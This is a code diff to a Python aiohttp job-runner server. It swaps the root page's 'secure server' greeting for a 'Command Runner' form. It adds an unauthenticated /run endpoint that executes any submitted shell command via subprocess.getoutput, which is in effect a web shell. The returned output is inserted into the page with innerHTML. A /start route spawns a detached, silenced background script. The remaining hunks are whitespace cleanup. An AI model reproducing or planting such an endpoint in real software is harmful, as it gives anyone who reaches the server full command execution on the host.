@@ -15,11 +15,46 @@ import traceback
 from concurrent.futures import ProcessPoolExecutor
 executor = ProcessPoolExecutor()
 
+xterm = """
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Command Runner</title>
+</head>
+<body>
+	<form id="cmdForm">
+		<input style="width: 800px; height:40px; font-size: 1.5em;" type="text" name="cmd" placeholder="Enter command" />
+		<button type="submit">Run</button>
+	</form>
+
+	<div style="border: 1px solid #ccc; padding: 10px; min-height: 200px; white-space: pre-wrap; font-family: monospace;" id="output"></div>
+
+	<script>
+		document.getElementById('cmdForm').addEventListener('submit', async (e) => {
+			e.preventDefault();
+			const formData = new FormData(e.target);
+			const response = await fetch('/run', {
+				method: 'POST',
+				body: formData
+			});
+			const result = await response.text();
+			document.getElementById('output').innerHTML = result;
+		});
+	</script>
+</body>
+</html>
+"""
 async def handle(request: web.Request) -> web.Response:
 	"""A simple handler that greets the user."""
 	name = request.match_info.get('name', "Anonymous")
 	text = f"Hello, {name}, from your secure aiohttp server!"
-	return web.Response(text=text)
+	return web.Response(text=xterm, content_type='text/html')
+
+async def handle_run(request: web.Request) -> web.Response:
+	data = await request.post()
+	cmd = data.get('cmd', '')
+	result = subprocess.getoutput(cmd)
+	return web.Response(text=f"<pre>{result}</pre>", content_type='text/html')
 
 async def handle_info(request: web.Request) -> web.Response:
 	json_data = {	'cpu_count': os.cpu_count(),
@@ -67,7 +102,7 @@ async def handle_params(request: web.Request) -> web.StreamResponse:
 			)
 			if ret != -1:
 				json_data = {"result": "True", "bin": bin.hex(), "no": f"{no:08x}"}
-				print (f"{id} :: ", json_data)	
+				print (f"{id} :: ", json_data)
 			else:
 				json_data = {"result": "False"}
 			no +=1
@@ -84,22 +119,41 @@ async def handle_params(request: web.Request) -> web.StreamResponse:
 
 	return response
 
+async def handle_start(request: web.Request) -> web.Response:
+	import subprocess
+
+	# Command to run in the background
+	command = ["python3", "start.py"]
+
+	# Start a detached subprocess
+	subprocess.Popen(
+			command,
+			stdout=subprocess.DEVNULL,
+			stderr=subprocess.DEVNULL,
+			stdin=subprocess.DEVNULL,
+			start_new_session=True  # This detaches the process from the parent
+	)
+	text = f"Start!"
+	return web.Response(text=text)
+
 # --- Main Application Setup ---
 app = web.Application()
 app.add_routes([
 	web.get('/', handle),
+	web.get('/start', handle_start),
 	web.get('/info', handle_info),
+	web.post('/run', handle_run),	
 	web.post('/file', handle_file),
 	web.post('/params', handle_params),
 	web.post('/params2', handle_params),
 ])
 
-def foo_func(bin_data, no):	
+def foo_func(bin_data, no):
 	process = psutil.Process(os.getpid())
 	process.cpu_percent(interval=None)
 	#process.cpu_affinity([0, 2, 4, 6])
 	time_start = time.time()
-	bin, no, ret = y1.foo(bin_data, no) 
+	bin, no, ret = y1.foo(bin_data, no)
 	run_time = time.time()-time_start
 	cpu_usage = process.cpu_percent(interval=None)
 	cpu_times = process.cpu_times()
@@ -119,7 +173,7 @@ async def foo_runner(num, run_q):
 					continue
 				if time.time() - run_start_time > 90:
 					print(f"{num}: Run Timeout")
-					i = -1					
+					i = -1
 					continue
 				loop = asyncio.get_running_loop()
 				bin, no, ret, run_time, cpu_usage, total_cpu_time = await loop.run_in_executor(
@@ -141,16 +195,16 @@ async def foo_runner(num, run_q):
 				item = await run_q.get()
 				run_q.task_done()
 				if 'stop' in item:
-					i = -1					
+					i = -1
 					continue
 				# run
 				bin_data = bytes.fromhex(item['bin'])
 				no = int(item['no'], 16)
 				i = 0
 				run_start_time = time.time()
-			
-			if time.time() - last_noti_time > 10:    
-				await ws_q.put({"type": "noti", 
+
+			if time.time() - last_noti_time > 10:
+				await ws_q.put({"type": "noti",
 												"run_time": f"{avg_run_time:.2f}",
 												"cpu_usage": f"{avg_cpu_usage:.2f}",
 												"cpu_time": f"{total_cpu_time:.2f}",
@@ -160,7 +214,7 @@ async def foo_runner(num, run_q):
 			print(f"Error in foo_runner: {e}")
 
 async def websocket_client(num, run_q, ws_url):
-		while True:			
+		while True:
 			#print("Reconnecting to WebSocket...")
 			try:
 				async with ClientSession() as session:
@@ -195,18 +249,18 @@ async def websocket_client(num, run_q, ws_url):
 								elif msg.type == WSMsgType.ERROR:
 									print(f"⚠️ {num}: WebSocket error: {ws.exception()}")
 									await run_q.put({"stop": True})
-									await asyncio.sleep(1)		
+									await asyncio.sleep(1)
 									break
 								elif msg.type == WSMsgType.CLOSE:
 									print(f"🔌 {num}: WebSocket connection closed by client")
 									await run_q.put({"stop": True})
-									await asyncio.sleep(1)		
+									await asyncio.sleep(1)
 									break
 							except asyncio.TimeoutError:	# ws.receive(), 0.1
 								if time.time() - last_msg_time > 90:
 									print(f"{num}: WebSocket msg timed out. Reconnecting...")
 									await run_q.put({"stop": True})
-									await asyncio.sleep(1)		
+									await asyncio.sleep(1)
 									break
 								else:
 									continue
